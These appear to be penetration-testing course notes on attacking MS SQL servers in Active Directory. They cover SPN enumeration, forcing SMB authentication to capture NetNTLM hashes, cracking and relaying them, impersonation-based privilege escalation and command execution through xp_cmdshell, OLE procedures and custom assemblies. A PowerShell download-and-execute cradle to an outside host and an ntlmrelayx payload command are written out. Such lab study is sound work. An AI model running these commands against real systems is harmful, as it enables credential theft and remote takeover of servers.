#### MS SQL Enumeration

When a MS SQL server is running in the context of an Active Directory service account, it is
normally associated with a Service Principal Name (SPN). Threrefore a discreet way of locating instances of MS SQL in an Active Directory
environment is to query the domain controller for all registered SPNs related to MS SQL.

If we own a domain user, we can query the domain controller with the native **setspn** tool

-T is the domain flag 
```
C:\Tools> setspn -T corp1 -Q MSSQLSvc/*
Checking domain DC=corp1,DC=com
CN=SQLSvc,OU=Corp1ServiceAccounts,OU=Corp1Users,DC=corp1,DC=com
MSSQLSvc/appsrv01.corp1.com:1433
MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS
MSSQLSvc/DC01.corp1.com:1433
```

#### MS SQL Authentication

Authentication in MS SQL is implemented in two stages. First, a traditional login is required. This
can be either an SQL server login or we can use Windows account-based authentication. SQL
server login is performed with local accounts on each individual SQL server. Windows
authentication on the other hand, works through Kerberos and allows any domain user to
authenticate with a Ticket Granting Service (TGS) ticket.

we may perform a login with the built-in SQL server sa account, which will map to
the datavase owner(dbo) account. If we perform a login with an account that has no associated SQL user
account, it will automatically be mapped to the built-in guest user account.

We can use SqlConnection class, [sqlconnect.cs](/13MSSQL/slqconnect.cs) to connect to the server. And run sql query.

#### UNC Path injection

We can force an SQL server with [forcesmb.cs](/13MSSQL/forcesmb.cs ) to connect to an SMB
share we control, the connection will include authentication data. If the hostname is given as an IP address, Windows will automatically revert to NTLM
authentication instead of Kerberos authentication.

on the attack machine, we need to set up the responder to catch the relay.

```
kali@kali:~$ sudo responder -I tap0

SQLSvc::corp1:00031db3ed40602b:A05501E7450025CF27120CE89BAF1C6E:0101000000000000C06531
50DE09D201F361A5C346497213000000000200080053004D004200330001001E00570049004E002D005000
.....
```
We can crack the NetNTLM hash with hashcat
```
kali@kali:~$ hashcat -m 5600 hash.txt dict.txt --force
```
#### relay the NetNTLM hash
First, we need to install impacket, and kali powershell
```
kali@kali:~$ sudo apt install python3-impacket
kali@kali:~$ sudo apt -y install powershell
```

invoke kali powershell to create base64encoded payload command 

```
kali@kali:~$ pwsh
PowerShell 7.0.

PS /home/kali> $text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
PS /home/kali> $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
PS /home/kali> $EncodedText = [Convert]::ToBase64String($bytes)
PS /home/kali> $EncodedText
KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AC
kALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAu
```

kick off netlm relay, and run our listener to catch the call back
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc payload'
```
#### Privilege Escalation

EXECUTE AS statement provides a way to execute a SQL query in the context of a different login or user. We could use this to escalate our ptivilege.

We can enumerate which logins allow impersonation, which get the this information using the database query
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals
b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```
Putting in it a c# script, we have [enumimpernoate.cs](/13MSSQL/enumImpernoate.cs)

after running the code, i identify that the sa login allow impersonation, we will try to impersonate the sa login with EXECUTE AS LOGIN = sa. so we have [ImpersonateSA.cs](/13MSSQL/ImpernoateSA.cs)

However, a database user can only perform actions on a given database. This means that
impersonation of a user with sysadmin role membership in a database does not necessarily lead
to server-wide sysadmin role membership. To fully compromise the database server, the database user we impersonate must be in a
database that has the **TRUSTWORTHY** property set.

The only native database with the TRUSTWORTHY property enabled is **msdb**. As is the case with many databases, the database owner (dbo) user has the sysadmin role. we can update our ImpersonateSA c# script to [impersonateDBO.cs](/13MSSQL/ImpersonateDBO.cs )

#### Remote code execution with xp_cmdshell

The xp_cmdshell stored procedure spawns a Windows command shell and passes in a string that
is then executed. The output of the command is returned by the procedure. To do this, we’ll need to begin with the impersonation of the
sa login. After this, we’ll use the sp_configure stored procedure to activate the advanced options
and then enable xp_cmdshell. The full implementation is in [xpcmdshell.cs](/13MSSQL/xpcmdshell.cs)

#### Remote code execution with sp_OACreate and sp_OAMethod

We can also use the sp_OACreate and sp_OAMethod stored procedures to create and execute a new stored procedure based on [Object Linking and
Embedding](https://en.wikipedia.org/wiki/Object_Linking_and_Embedding)

SQL statement to create local variable and instantiate the OLE object.
```
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
```


sp_OAMethod prototype, take the name of the procedure(objecttoken), method of the OLE(methodname)->run, optional output variable,and parameters for the invoked method
```
sp_OAMethod objecttoken , methodname
[ , returnvalue OUTPUT ]
[ , [ @parametername = ] parameter [ OUTPUT ] [ ...n ] ]
```
The example source code, [soOAMethod.cs](/13MSSQL/spOAMethod.cs) which create a file in remote host. 

#### Custom Assemblies
If a database has TRUSTWORTHY property set, it’s possible to use the CREATE ASSEMBLY924 statement to import a managed DLL as an object inside the SQL server and execute methods within it.

- 1.We will first create a Class Library, [cmdExec](/13MSSQL/cmdExec.cs) in .NET for cmd execution
- 2.We can compiled the cs into dll and convert it to a hex string [toHex.ps1](/13MSSQL/toHex.ps1). The hex string can be embbeded inside the  create assembly statement for later use.
- 3.Create the c# code that query the sql remotely. [AssemblyLoad.cs](/13MSSQL/AssemblyLoad.cs), complied and run
- 4.Lastly, you can't call create assembly multipule times, you must remove it with [cleanup.cs](/13MSSQL/cleanup.cs)

#### SQL Link

When a link from one SQL server to another is created, the administrator must specify the
execution context that will be used during the connection. If the administrator chooses a specific SQL login and that login has sysadmin role membership,
we would obtain sysadmin privileges on the linked SQL server. This will be the case even if we
only have low privileged access on the original SQL server.

- 1.We need to enumerate servers linked to the current SQL server with [linkenum.cs](/13MSSQL/linkenum.cs). We can use sp_linkedservesr stored procedure returns a list of linked servers for us.
- 2.Check if possible to run command across the link using OPENQUERY, and check the security context. [checklink.cs](/13MSSQL/linkcheck.cs)
- 3.If you have sa permission over the link database, you could  execute PowerShell shellcode runner through a download cradle with the xp_cmdshell stored
procedure. [linkshellcode.cs](/13MSSQL/linkshellcode.cs)
